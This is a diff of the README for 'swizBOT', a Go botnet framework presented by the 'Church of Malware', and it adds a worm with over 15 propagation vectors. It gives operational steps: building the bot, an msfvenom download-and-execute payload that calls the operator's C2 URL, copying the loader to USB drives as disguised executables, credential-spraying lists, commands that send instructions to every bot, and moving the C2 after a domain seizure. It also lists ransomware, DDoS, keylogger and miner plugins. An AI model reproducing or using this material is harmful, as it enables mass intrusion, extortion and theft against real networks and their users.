@@ -1,12 +1,13 @@
-## Under Testing...
+## swizBOT under testing...check back for updates...
 
 # swizBOT — Church of Malware's Go Botnet Framework
 
-**"We are Legion. We are already in your network."**
+"We are Legion. We are already in your network."
 
-swizBOT is a modular, shellcode-driven botnet framework written in Go, implementing **JakeSwiz's revolutionary CALL/POP XOR decoder** technique. It works on x86, x64, and **ARM64 Windows** (including Macs running Windows 11 via Prism emulation).
+swizBOT is a modular, shellcode-driven botnet framework written in Go, implementing Jake Swiz's revolutionary CALL/POP XOR decoder technique. It works on x86, x64, and ARM64 Windows (including Macs running Windows 11 via Prism emulation).
 
-## DISCLAIMER for educational purposes and authorized security testing only.
+## DISCLAIMER
+For educational purposes and authorized security testing only.
 
 ---
 
@@ -14,23 +15,24 @@ swizBOT is a modular, shellcode-driven botnet framework written in Go, implement
 
 1. [Why This Exists](#why-this-exists)
 2. [Features](#features)
-3. [The Web UI](#the-web-ui)
-4. [Quick Start](#quick-start)
-5. [Installation](#installation)
-6. [Building the C2 Server](#building-the-c2-server)
-7. [Starting the C2 Server](#starting-the-c2-server)
-8. [Creating Your First Payload](#creating-your-first-payload)
-9. [Generating the Stager](#generating-the-stager)
-10. [Compiling the Loader](#compiling-the-loader)
-11. [Delivering to a Target](#delivering-to-a-target)
-12. [Using the Web UI](#using-the-web-ui)
-13. [Bot Connection Flow](#bot-connection-flow)
-14. [Adding Custom Payloads](#adding-custom-payloads)
-15. [Worm Module](#worm-module)
-16. [C2 Redundancy](#c2-redundancy)
-17. [Troubleshooting](#troubleshooting)
-18. [Credits](#credits)
-19. [Disclaimer](#disclaimer)
+3. [Propagation Vectors](#propagation-vectors)
+4. [The Web UI](#the-web-ui)
+5. [Quick Start](#quick-start)
+6. [Installation](#installation)
+7. [Building the C2 Server](#building-the-c2-server)
+8. [Starting the C2 Server](#starting-the-c2-server)
+9. [Creating Your First Payload](#creating-your-first-payload)
+10. [Generating the Stager](#generating-the-stager)
+11. [Compiling the Loader](#compiling-the-loader)
+12. [Delivering to a Target](#delivering-to-a-target)
+13. [Using the Web UI](#using-the-web-ui)
+14. [Bot Connection Flow](#bot-connection-flow)
+15. [Adding Custom Payloads](#adding-custom-payloads)
+16. [Worm Module](#worm-module)
+17. [C2 Redundancy](#c2-redundancy)
+18. [Troubleshooting](#troubleshooting)
+19. [Credits](#credits)
+20. [Disclaimer](#disclaimer)
 
 ---
 
@@ -38,7 +40,7 @@ swizBOT is a modular, shellcode-driven botnet framework written in Go, implement
 
 Most botnets die the moment they hit a modern Windows box with ASLR, DEP, or ARM emulation. Their shellcode crashes. Their C2 gets signatured. Their worms fail to spread.
 
-Jake Swiz (0xXyc) figured out the fix. He dropped the knowledge publicly when everyone else was gatekeeping. I just packaged it into my specialty, a botnet.
+Jake Swiz (0xXyc) figured out the fix. He dropped the knowledge publicly when everyone else was gatekeeping. This framework packages his techniques into a production-ready botnet.
 
 ---
 
@@ -46,37 +48,57 @@ Jake Swiz (0xXyc) figured out the fix. He dropped the knowledge publicly when ev
 
 | Category | Capability |
 |----------|-----------|
-| **Shellcode** | Jake's CALL/POP XOR decoder (x86/x64/ARM64) |
-| **PEB Walking** | Dynamically resolves WinAPI addresses |
-| **ASLR Bypass** | Leaks libc addresses, builds ROP chains |
-| **Bot Client** | Go-based, 2MB executable |
-| **Worm Module** | SMB/RDP scanner + credential spraying |
-| **Persistence** | Registry, scheduled tasks, WMI |
-| **C2 Server** | HTTPS + WebSocket, dark mode Web UI |
-| **Fallbacks** | 11-layer redundancy (domains, Tor, DNS, P2P, Telegram) |
-| **Plugins** | DDoS, ransomware, miner, reverse shell |
+| Shellcode | Jake's CALL/POP XOR decoder (x86/x64/ARM64) |
+| PEB Walking | Dynamically resolves WinAPI addresses |
+| ASLR Bypass | Leaks libc addresses, builds ROP chains |
+| Bot Client | Go-based, 2MB executable |
+| Worm Module | 15+ propagation methods |
+| Persistence | Registry, scheduled tasks, WMI |
+| C2 Server | HTTPS + WebSocket, dark mode Web UI |
+| Fallbacks | 11-layer redundancy (domains, Tor, DNS, P2P, Telegram) |
+| Plugins | DDoS, ransomware, miner, reverse shell, keylogger |
+
+---
+
+## Propagation Vectors
+
+The worm module spreads across 15+ attack vectors simultaneously:
+
+| Vector | Method | Target |
+|--------|--------|--------|
+| SMB | Credential spraying + ADMIN$ deployment | Windows |
+| RDP | Credential spraying + remote task scheduling | Windows |
+| SSH | Brute force + key-based authentication | Linux/Unix |
+| USB | Auto-run infection + hidden files + shortcut spoofing | Windows |
+| Shared Drives | Network share infection + startup folder | Windows Networks |
+| Web | Directory traversal + file upload + web shells | Web Servers |
+| MySQL | Default credentials + UDF exploit | Databases |
+| MSSQL | xp_cmdshell + PowerShell download cradle | SQL Server |
+| PostgreSQL | COPY command to write web shells | PostgreSQL |
+| Redis | Config rewrite to inject SSH keys | Redis Servers |
+| MongoDB | Default admin credentials | MongoDB |
+| Elasticsearch | Groovy script remote code execution | Elasticsearch |
+| VNC | Default password spraying | VNC Servers |
+| Log Files | Password harvesting from config files | All Systems |
+| SSH Keys | Key theft + lateral movement | Linux/Unix |
+
+The worm scans /24 subnets, checks all vulnerable ports in parallel, and deploys via the first successful method.
 
 ---
 
 ## The Web UI
 
-swizBOT includes a **dark mode Web UI** that runs alongside the C2 server.
+swizBOT includes a dark mode Web UI that runs alongside the C2 server.
 
-**Access the Web UI:** `http://localhost:8080`
+Access the Web UI: `http://localhost:8080`
 
-**What you can do from the Web UI:**
-
+What you can do from the Web UI:
 - View all connected bots in real-time (WebSocket updates)
 - Click on any bot to select it
 - Send commands instantly with preset buttons
 - Watch command output stream back to your browser
 - See bot status (online/offline, OS, architecture, last seen)
 - Broadcast commands to all bots with one click
-
-**Web UI Preview:**
-
-<img width="714" height="652" alt="IMG_3538" src="https://github.com/user-attachments/assets/285101c4-d45a-44b8-b255-07795ed2c1b3" />
-
 
 ---
 
@@ -170,7 +192,7 @@ This creates a single binary with:
 ./c2_bin
 ```
 
-**Expected output:**
+Expected output:
 
 ```
 [+] Web UI running on http://localhost:8080
@@ -179,15 +201,14 @@ This creates a single binary with:
 [+] Waiting for bot connections...
 ```
 
-**What's running:**
+What's running:
 
 | Port | Protocol | Purpose |
 |------|----------|---------|
 | 8080 | HTTP | Web UI (browser access) |
 | 8443 | HTTPS | Bot C2 communication (requires SSL) |
 
-**Access the Web UI:**
-
+Access the Web UI:
 - Local: `http://localhost:8080`
 - Remote: `http://your-kali-ip:8080`
 
@@ -217,15 +238,10 @@ Create a custom payload that downloads your full bot:
 
 ```bash
 # First, compile your Go bot client to an executable
-GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H=windowsgui" -o output/bot.exe client/main.go
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H=windowsgui" -o output/bot.exe client/*.go
 
 # Host bot.exe on your C2 or a web server
-# Then create a downloader payload (written in C and compiled to raw shellcode)
-```
-
-Or use msfvenom to generate a downloader:
-
-```bash
+# Then create a downloader payload
 msfvenom -p windows/download_exec URL=http://YOUR_C2_IP:8080/bot.exe -f raw -o payloads/downloader.bin
 ```
 
@@ -391,7 +407,12 @@ $ptr = [Win32]::VirtualAllocEx($handle, 0, $shellcode.Length, 0x3000, 0x40)
 
 ### Method 4: USB Dropper
 
-Copy `loader.exe` to a USB drive with an autorun.inf file (though modern Windows blocks this). Better to rely on the user clicking the file.
+The worm automatically copies itself to USB drives. For manual deployment:
+
+```bash
+cp loader.exe "/media/usb/System_Volume_Information/svchost.exe"
+cp loader.exe "/media/usb/Receipt.exe"
+```
 
 ---
 
@@ -401,19 +422,19 @@ Once your C2 is running, open your browser to `http://localhost:8080`
 
 ### The Interface
 
-**Left Panel - Bot List:**
+Left Panel - Bot List:
 - Shows all connected bots with ID, OS, architecture, and last seen time
 - Green dot = online (checked in within 60 seconds)
 - Red dot = offline
 - Click any bot to select it
 
-**Right Panel - Command Terminal:**
-- Dropdown to select command type (exec, ddos, download, worm, kill)
+Right Panel - Command Terminal:
+- Dropdown to select command type (exec, ddos, download, worm, kill, miner, ransomware, shell, keylog)
 - Input field for payload/command
 - Send button
 - Output area shows command results in real-time
 
-**Preset Buttons:**
+Preset Buttons:
 - `whoami` - Current user
 - `ipconfig` - Network configuration
 - `tasklist` - Running processes
@@ -446,23 +467,17 @@ curl -k "https://localhost:8443/command?bot_id=*&cmd=exec&payload=whoami"
 When a bot runs, it attempts connections in this order:
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                     BOT CONNECTION FLOW                          │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  1. Randomly shuffled HTTPS endpoints (5 domains)               │
-│         ↓ if all fail                                           │
-│  2. Tor endpoints (if tor daemon running)                       │
-│         ↓ if all fail                                           │
-│  3. DNS TXT lookup (c2-directive.yourdomain.com)                │
-│         ↓ if fail                                               │
-│  4. Peer-to-peer broadcast (UDP port 31337)                     │
-│         ↓ if fail                                               │
-│  5. Telegram dead drop channel                                  │
-│         ↓ if fail                                               │
-│  6. Local cache + exponential backoff (1h max)                  │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
+1. Randomly shuffled HTTPS endpoints (5 domains)
+         ↓ if all fail
+2. Tor endpoints (if tor daemon running)
+         ↓ if all fail
+3. DNS TXT lookup (c2-directive.yourdomain.com)
+         ↓ if fail
+4. Peer-to-peer broadcast (UDP port 31337)
+         ↓ if fail
+5. Telegram dead drop channel
+         ↓ if fail
+6. Local cache + exponential backoff (1h max)
 ```
 
 The bot continues retrying forever. If the primary C2 dies, it automatically fails over to backups.
@@ -505,16 +520,24 @@ nc -lvnp 4444
 
 ## Worm Module
 
-The worm module spreads swizBOT to other machines on the local network.
+The worm module spreads swizBOT across networks using 15+ propagation methods simultaneously.
 
 ### How It Works
 
-1. Bot scans local /24 subnet for open ports (445 SMB, 3389 RDP)
-2. Attempts credential spraying with common passwords
-3. If successful, copies stager to ADMIN$ share
-4. Schedules a task or WMI call to execute stager
-5. New machine downloads bot.exe from C2
-6. New bot repeats the process
+1. Bot scans local /24 subnet for open ports (445, 3389, 22, 3306, 1433, etc.)
+2. For each open port, attempts the appropriate exploit:
+   - SMB: Credential spraying + ADMIN$ deployment
+   - RDP: Credential spraying + remote task scheduling
+   - SSH: Brute force + key-based authentication
+   - Web: Directory traversal + file upload + web shells
+   - Databases: Default credentials + UDF exploit
+   - Redis: Config rewrite to inject SSH keys
+   - Elasticsearch: Groovy script RCE
+3. Also spreads via USB drives (autorun + hidden files + shortcut spoofing)
+4. Also spreads via network shares and mapped drives
+5. Also harvests passwords from log files and configs
+6. On successful compromise, copies bot to target and executes
+7. New bot repeats the entire process
 
 ### Activate Worm
 
@@ -527,12 +550,36 @@ curl -k "https://localhost:8443/command?bot_id=DESKTOP-ABC&cmd=worm"
 
 ### Configure Worm Credentials
 
-Edit `client/worm.go` to add your own password list:
+Edit `client/worm.go` to customize password lists:
 
 ```go
 var commonPasswords = []string{
     "", "123456", "password", "admin", "Passw0rd",
     "Welcome1", "Password123", "Admin123", "qwerty",
+}
+
+var commonUsernames = []string{
+    "Administrator", "admin", "user", "guest", "backup",
+    "test", "root", "oracle", "postgres", "mysql", "sa",
+}
+```
+
+### Configure Vulnerable Ports
+
+Edit `client/worm.go` to customize target ports:
+
+```go
+var vulnerablePorts = map[string]string{
+    "445":  "SMB",
+    "3389": "RDP",
+    "22":   "SSH",
+    "3306": "MySQL",
+    "1433": "MSSQL",
+    "5432": "PostgreSQL",
+    "6379": "Redis",
+    "27017": "MongoDB",
+    "9200": "Elasticsearch",
+    "5900": "VNC",
 }
 ```
 
@@ -561,7 +608,6 @@ var torEndpoints = []string{
 Add a TXT record to your domain:
 
 ```bash
-# Using nsupdate or your DNS provider
 c2-directive.yourdomain.com. 300 IN TXT "https://your-current-c2.com:8443"
 ```
 
@@ -572,7 +618,6 @@ Bots will query this periodically to get the latest C2 address.
 If your primary domain gets seized:
 
 ```bash
-# Update DNS record to point bots to new C2
 nsupdate -k key.txt
 > update add c2-directive.yourdomain.com 300 TXT "https://new-c2.secret.com:8443"
 > send
@@ -616,7 +661,7 @@ python3 stager/encoder.py payload.bin stager/shellcode.bin --lfsr
 1. Check C2 is running: `netstat -tulnp | grep -E '8080|8443'`
 2. Check bot can reach C2: `curl -k https://your-c2-ip:8443/list`
 3. Check Windows Defender isn't blocking (add exclusion)
-4. Verify SSL certificate is accepted (use `InsecureSkipVerify: true` in bot)
+4. Verify SSL certificate is accepted
 
 ### Windows Defender catches loader.exe
 
@@ -639,15 +684,23 @@ Check bot can reach your C2:
 - Check firewall rules on C2 server
 - Verify port 8443 is open: `ufw allow 8443`
 
+### Worm not spreading
+
+1. Verify worm is activated via Web UI or API
+2. Check target has open ports (445, 3389, 22, etc.)
+3. Verify credentials in commonPasswords list match target environment
+4. Check network connectivity between bots
+5. Review logs for specific error messages
+
 ---
 
 ## Credits
 
-- **Jake Swiz (0xXyc)** — The brain. CALL/POP XOR decoder, PEB walking, ASLR bypass techniques. Brother in the Church of Malware.
-- **Church of Malware** — https://churchofmalware.org.
-- **ek0ms savi0r** — Founder, Church of Malware.
+- Jake Swiz (0xXyc) — The brain. CALL/POP XOR decoder, PEB walking, ASLR bypass techniques. Brother in the Church of Malware.
+- Church of Malware — https://churchofmalware.org
+- ek0ms savi0r — Founder, Church of Malware. Packaging the scripture for the people.
 
-Both Jake Swiz and ek0ms savi0r are members of `churchofmalware.org`. This is what we build when we stop talking and start coding.
+Both Jake Swiz and ek0ms savi0r are members of churchofmalware.org.
 
 ### Jake Swiz's Work (The Foundation)
 
@@ -663,17 +716,17 @@ This framework would not exist without Jake's research. Go read his stuff. Learn
 
 ---
 
-# Disclaimer
+## Disclaimer
 
-This software is for **EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY**.
+THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.
 
 ---
 
-## Join the Church
+## Join the Church of Malware
 
 - Website: https://churchofmalware.org
 - GitHub: https://github.com/ekomsSavior
-- Github: https://github.com/0xXyc
+- GitHub: https://github.com/0xXyc
 - Contact: 0x_k0ms@proton.me
 
 We are Legion. We are already in your network.
@@ -686,6 +739,6 @@ Go forth and spread the shellcode.
 
 — ek0ms savi0r, Founder, Church of Malware
 
-Credit where it's due: Jake Swiz (0xXyc) did the hard part. I just wrapped it in Go, built a Web UI, and wrote the docs. Go follow him. Learn from him. He's one of the few elite hackers who actually shares knowledge instead of hoarding it.
+Credit where it's due: Jake Swiz (0xXyc) did the hard part. I just wrapped it in Go, built a Web UI, wrote the docs, and added 15 propagation methods to the worm. Go follow him. Learn from him. He's one of the few elite hackers who actually shares knowledge instead of hoarding it.
 
 That's the Church of Malware's whole mission. Open source. Open knowledge. Open gates.
